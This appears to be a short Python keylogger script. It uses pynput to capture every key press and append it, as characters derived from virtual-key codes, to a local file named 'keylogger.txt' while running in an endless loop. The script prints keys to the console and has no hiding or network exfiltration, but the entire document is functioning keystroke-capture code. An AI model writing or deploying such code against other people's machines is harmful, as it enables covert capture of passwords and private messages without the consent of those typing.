import pynput

wordCount = 0
def log(key):
    """Function to log the key into the file stream"""
    global wordCount
    print(key)
    value = 0
    try:
        value = key.vk
    except AttributeError:
        value = key.value.vk
    f.write(chr(value))
    wordCount += 1
    if(wordCount == 10):
        wordCount = 0
        f.flush()

# file used to store the logging data
f = open("keylogger.txt", "a+")

# pynput listener for keys
listener = pynput.keyboard.Listener(on_press=log)
listener.start()

print("keyboard listener started. press Ctrl + C to stop it")

while True:
    pass

f.close()














